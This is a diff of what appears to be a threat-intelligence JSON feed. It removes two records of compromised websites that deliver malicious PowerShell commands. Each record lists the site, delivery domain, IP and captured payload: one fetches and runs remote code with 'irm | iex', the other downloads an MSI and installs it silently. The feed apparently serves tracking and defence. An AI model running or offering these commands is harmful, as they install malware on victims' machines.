@@ -12320,46 +12320,5 @@
     ],
     "ReportId": "cmwl6sv421hpq0omls4ocdb1w",
     "ScannedAt": "2026-11-17T21:10:58.737000+00:00"
-  },
-  {
-    "UrlDomain": "spacegnomestudio.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "50.87.253.14"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/1c1a06922ba83122",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/1c1a06922ba83122'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/1c1a06922ba83122"
-    ],
-    "ReportId": "cmwl6e29x1ho90oml4soletk3",
-    "ScannedAt": "2026-11-17T20:59:28.173000+00:00"
-  },
-  {
-    "UrlDomain": "karaikudirealestate.com",
-    "DeliveryUrl": [
-      "updatchk.com"
-    ],
-    "PayloadUrl": [
-      "https://updatchk.com/x"
-    ],
-    "IP": [
-      "77.37.53.9"
-    ],
-    "Related": [],
-    "Payload": "$f=\"$env:TEMP\\$([guid]::NewGuid().ToString('N').Substring(0,10)).msi\";iwr \"https://updatchk[.]com/x\" -OutFile $f -UseBasicParsing;cmd /c msiexec /i $f /qn;exit",
-    "ResolvedDownloadUrl": [
-      "https://updatchk.com/x"
-    ],
-    "ReportId": "cmwl5x2pj1hne0omlek9idizj",
-    "ScannedAt": "2026-11-17T20:46:15.496000+00:00"
   }
 ]
